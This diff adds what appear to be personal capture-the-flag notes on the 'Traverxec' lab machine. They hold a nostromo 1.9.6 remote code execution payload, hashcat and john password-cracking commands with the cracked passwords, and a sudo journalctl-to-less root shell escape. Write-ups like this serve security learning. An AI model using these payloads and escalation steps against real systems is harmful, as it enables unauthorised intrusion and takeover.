@@ -1,0 +1,77 @@
+---PORT ENUM---
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
+|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
+|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
+80/tcp open  http    nostromo 1.9.6
+|_http-server-header: nostromo 1.9.6
+|_http-title: TRAVERXEC
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---ATTEMPTS---
+search for nostromo 1.9.6 in duckduckgo the first answer was the exploitdb page for uRCE so pretty straight forward
+the exploit is a pretty simple one, it just sends a post request with the path to /bin/sh and command:
+  'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\nCOMMAND 2>&1'
+better explanation: https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html
+done!
+
+---PRIVESC---
+*./linpeash:
+  david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ - md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+sudo is vulnerable but www-data cannot exploit
+*sudo -V
+  1.8.27
+running hashcat:
+*hashcat -m 500 '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' /usr/share/wordlists/rockyou.txt
+  $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
+
+*./LinEnum.sh:
+  SERVER_ADMIN=david@traverxec.htb
+  # HOMEDIRS [OPTIONAL]
+  homedirs                /home
+  homedirs_public         public_www
+
+found a backup file in public_www/protected-file-area:
+  backup-ssh-identity-files.tgz
+it contains the .ssh folder with the public/private keys and authorized keys
+trying to login into ssh:
+*ssh -i id_rsa david@10.10.10.165
+  Enter passphrase for key 'id_rsa':
+
+trying to crack this rsa key
+*sudo ssh2john id_rsa > johnrsa
+*sudo john --format=ssh johnrsa -w /usr/share/wordlists/rockyou.txt
+done!
+*sudo john johnrsa --show
+  id_rsa:hunter
+
+*whoami
+  david
+*cat /home/david/user.txt
+
+*could not exploit the sudo vuln
+
+when ssh login it execute run-parts without a hard path
+*echo $PATH:
+  /home/david/bin
+creating a run-parts inside /home/david/bin (unsuccessful)
+
+trying to sudo -l
+*sudo -l
+  Nowonly4me (unsuccessful)
+  hunter (unsuccessful)
+
+*./pspy64:
+  sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+
+bin folder inside home that have a server-stats.sh
+  /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+using pspy to see if root execute this (unsuccessful)
+user david can run server-stats.sh without a problem even though it runs a sudo command. so it probably can run journalctl as sudo without a pass. the problem is journalctl executs less and inside less command it is possible to execute shell commands
+*/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.server | /usr/bin/cat
+and type !/bin/bash inside less
+kudos!
+
+cat /root/root.txt
